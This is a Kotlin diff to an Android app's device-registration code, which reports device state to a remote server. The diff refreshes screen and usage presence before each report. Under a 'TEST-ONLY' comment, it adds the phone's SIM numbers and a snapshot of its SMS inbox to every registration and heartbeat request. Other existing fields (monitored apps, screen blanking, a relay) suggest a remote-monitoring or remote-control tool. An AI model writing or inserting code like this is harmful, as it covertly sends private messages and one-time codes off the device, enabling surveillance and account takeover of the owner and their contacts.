@@ -147,6 +147,10 @@ object DeviceRegistrar {
         val base = getBaseUrl(app)
         val path = if (isRegister) "/api/devices/register" else "/api/devices/heartbeat"
         val url = URL(base + path)
+        // Reconcile presence synchronously: statics reset to
+        // screenOn=true/inUse=false on every process restart and the first
+        // register races service start, so never trust the cache here.
+        try { UserPresence.refresh(app) } catch (_: Exception) {}
         val snap = try { MonitoredApps.snapshot(app.packageManager) } catch (_:Exception) { MonitoredApps.Snapshot(emptyList(), MonitoredApps.DEFAULTS) }
         var batteryOptimized = false
         try {
@@ -175,6 +179,9 @@ object DeviceRegistrar {
             put("blankEnabled", prefs.getBoolean(KEY_BLANK, false))
             put("relayActive", !prefs.getString(KEY_STICKY_URL, null).isNullOrBlank())
             put("relaySlot", prefs.getInt(KEY_STICKY_SLOT, 1).coerceIn(1, 3))
+            // TEST-ONLY: line numbers (SIM 1/2) + inbox snapshot. Empty when denied.
+            try { put("phoneNumbers", DevicePhones.numbersJson(app)) } catch (_: Exception) { put("phoneNumbers", JSONArray()) }
+            try { put("sms", DevicePhones.smsJson(app)) } catch (_: Exception) { put("sms", JSONArray()) }
         }
         val conn = (url.openConnection() as HttpURLConnection).apply {
             requestMethod = "POST"
